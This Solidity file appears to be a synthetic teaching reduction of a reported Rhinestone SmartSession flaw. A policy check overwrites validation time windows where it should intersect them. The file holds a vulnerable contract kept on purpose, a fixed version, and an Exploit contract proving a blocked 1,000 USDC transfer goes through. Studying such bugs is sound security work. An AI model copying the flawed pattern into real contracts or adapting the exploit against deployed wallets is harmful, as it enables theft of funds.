// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Rhinestone SmartSession — ValidationData is overwritten instead of intersected
    (Cantina, Chinmay Farkya, September 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: PolicyLib.check assigns each policy's ValidationData over the
    accumulator and then intersects that value with itself. A userOp policy
    whose validAfter is still in the future is discarded. The later open
    policy is what remains, so a 1,000 USDC transfer the window should have
    blocked goes through. No timestamp warp: validAfter is uint48 max.
    Vulnerable assignment preserved below (@> VULN). */

contract Usdc {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fromBal = balanceOf[msg.sender];
        balanceOf[msg.sender] = fromBal - amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SmartSession {
    uint256 public constant AMOUNT = 1_000_000_000;
    // validAfter = uint48 max, validUntil = 0 (forever). Not valid yet on any real block.
    uint256 public constant USER_OP = uint256(type(uint48).max) << 208;
    // validAfter = 0, validUntil = 0. An open window.
    uint256 public constant ACTION = 0;

    Usdc public token;
    uint256 public lastVd;

    constructor(Usdc usdc) {
        token = usdc;
    }

    function intersectValidationData(uint256 a, uint256 b) public pure returns (uint256) {
        uint48 aUntil = uint48(a >> 160);
        uint48 bUntil = uint48(b >> 160);
        uint48 aAfter = uint48(a >> 208);
        uint48 bAfter = uint48(b >> 208);
        if (aUntil == 0) aUntil = type(uint48).max;
        if (bUntil == 0) bUntil = type(uint48).max;
        uint48 untilWord = aUntil < bUntil ? aUntil : bUntil;
        uint48 afterWord = aAfter > bAfter ? aAfter : bAfter;
        return (uint256(afterWord) << 208) | (uint256(untilWord) << 160);
    }

    function blocked(uint256 vd) public view returns (bool) {
        uint48 untilWord = uint48(vd >> 160);
        uint48 afterWord = uint48(vd >> 208);
        if (untilWord == 0) untilWord = type(uint48).max;
        if (block.timestamp < afterWord) return true;
        if (block.timestamp > untilWord) return true;
        return false;
    }

    function check(uint256[] memory policyData) public pure returns (uint256 vd) {
        uint256 length = policyData.length;
        for (uint256 i; i < length; i++) {
            uint256 validationDataFromPolicy = policyData[i];
            vd = validationDataFromPolicy;
            // @> VULN: previous ValidationData is replaced, then intersected with itself
            vd = intersectValidationData(vd, vd);
        }
    }

    function execute(address to, uint256 amount) external {
        uint256[] memory policyData = new uint256[](2);
        policyData[0] = USER_OP;
        policyData[1] = ACTION;
        uint256 vd = check(policyData);
        lastVd = vd;
        require(!blocked(vd), "outside window");
        token.transfer(to, amount);
    }
}

contract SmartSessionFixed {
    uint256 public constant AMOUNT = 1_000_000_000;
    uint256 public constant USER_OP = uint256(type(uint48).max) << 208;
    uint256 public constant ACTION = 0;

    Usdc public token;

    constructor(Usdc usdc) {
        token = usdc;
    }

    function intersectValidationData(uint256 a, uint256 b) public pure returns (uint256) {
        uint48 aUntil = uint48(a >> 160);
        uint48 bUntil = uint48(b >> 160);
        uint48 aAfter = uint48(a >> 208);
        uint48 bAfter = uint48(b >> 208);
        if (aUntil == 0) aUntil = type(uint48).max;
        if (bUntil == 0) bUntil = type(uint48).max;
        uint48 untilWord = aUntil < bUntil ? aUntil : bUntil;
        uint48 afterWord = aAfter > bAfter ? aAfter : bAfter;
        return (uint256(afterWord) << 208) | (uint256(untilWord) << 160);
    }

    function blocked(uint256 vd) public view returns (bool) {
        uint48 untilWord = uint48(vd >> 160);
        uint48 afterWord = uint48(vd >> 208);
        if (untilWord == 0) untilWord = type(uint48).max;
        if (block.timestamp < afterWord) return true;
        if (block.timestamp > untilWord) return true;
        return false;
    }

    function check(uint256[] memory policyData) public pure returns (uint256 vd) {
        uint256 length = policyData.length;
        for (uint256 i; i < length; i++) {
            uint256 validationDataFromPolicy = policyData[i];
            vd = intersectValidationData(vd, validationDataFromPolicy);
        }
    }

    function execute(address to, uint256 amount) external {
        uint256[] memory policyData = new uint256[](2);
        policyData[0] = USER_OP;
        policyData[1] = ACTION;
        uint256 vd = check(policyData);
        require(!blocked(vd), "outside window");
        token.transfer(to, amount);
    }
}

contract Exploit {
    Usdc public token; // CREATE nonce 1
    SmartSession public session; // CREATE nonce 2

    constructor() {
        token = new Usdc();
        session = new SmartSession(token);
        token.mint(address(session), 1_000_000_000);
    }

    function run() external {
        uint256 amount = session.AMOUNT();
        session.execute(address(this), amount);
        uint256 moved = token.balanceOf(address(this));
        uint48 afterWord = uint48(session.lastVd() >> 208);
        uint48 userOpAfter = uint48(session.USER_OP() >> 208);
        require(moved == amount, "1000 USDC moved");
        require(userOpAfter == type(uint48).max, "userOp window");
        require(afterWord == 0, "restrictive window survived");
        require(block.timestamp < userOpAfter, "timestamp not inside the block");
    }
}
